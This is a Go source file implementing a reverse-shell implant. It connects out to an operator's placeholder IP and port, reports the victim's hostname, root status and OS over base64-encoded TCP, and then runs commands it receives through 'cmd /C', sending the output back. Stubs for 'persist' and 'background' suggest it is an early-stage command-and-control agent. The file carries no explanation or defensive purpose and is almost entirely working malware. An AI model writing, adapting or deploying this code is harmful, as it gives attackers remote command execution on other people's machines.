package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var sock net.Conn

func encodeBase64(input []byte) string {
	return base64.StdEncoding.EncodeToString(input)
}

func decodeBase64(input string) []byte {
	data, err := base64.StdEncoding.DecodeString(input)
	if err != nil {
		fmt.Println("Error decoding base64:", err)
	}
	return data
}

func outbound(message string) {
	encodedMessage := encodeBase64([]byte(message))
	sock.Write([]byte(encodedMessage))
	sock.Write([]byte("\n"))
}

func inbound() string {
	buffer := make([]byte, 1024)
	n, err := sock.Read(buffer)
	if err != nil {
		return ""
	}
	decodedMessage := decodeBase64(string(buffer[:n]))
	return string(decodedMessage)
}

func main() {
	hostIP := "INPUT_IP_HERE"
	hostPort := INPUT_PORT_HERE

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", hostIP, hostPort))
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()
	sock = conn

	hostName, _ := os.Hostname()
	outbound(hostName)

	isAdmin := "no"
	if os.Getuid() == 0 {
		isAdmin = "yes"
	}
	outbound(isAdmin)

	time.Sleep(1 * time.Second)
	opSys := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
	outbound(opSys)

	for {
		message := inbound()

		if message == "" {
			break
		}

		if message == "exit" {
			break
		} else if message == "persist" {

		} else if strings.HasPrefix(message, "cd") {
			dir := strings.TrimSpace(strings.TrimPrefix(message, "cd"))
			err := os.Chdir(dir)
			if err != nil {
				outbound("Invalid directory. Try again.")
			} else {
				currentDir, _ := os.Getwd()
				outbound(currentDir)
			}
		} else if message == "background" {

		} else if message == "help" {

		} else {
			cmd := exec.Command("cmd", "/C", message)
			output, err := cmd.CombinedOutput()
			if err != nil {
				outbound(err.Error())
			} else {
				outbound(string(output))
			}
		}
	}
}
